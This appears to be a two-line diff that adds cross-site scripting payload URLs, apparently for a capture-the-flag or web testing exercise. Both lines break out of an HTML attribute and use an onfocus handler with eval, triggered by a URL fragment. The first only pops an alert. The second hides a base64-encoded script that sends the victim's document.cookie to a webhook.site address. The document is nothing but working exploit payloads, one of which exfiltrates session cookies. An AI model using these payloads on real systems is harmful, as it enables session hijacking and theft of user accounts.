@@ -1,0 +1,2 @@
+http://localhost/'id='alert(1)'onfocus='eval(decodeURIComponent(this.id))'name='z'#z
+http://app:8080/'id='eval(atob(`bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2NjNDg5NGI2LWNhZTktNGIyZS05NDRlLWQwOWI1MmU0NzA0MT8ke2RvY3VtZW50LmNvb2tpZX1g`))'onfocus='eval(decodeURIComponent(this.id))'name='z'#z
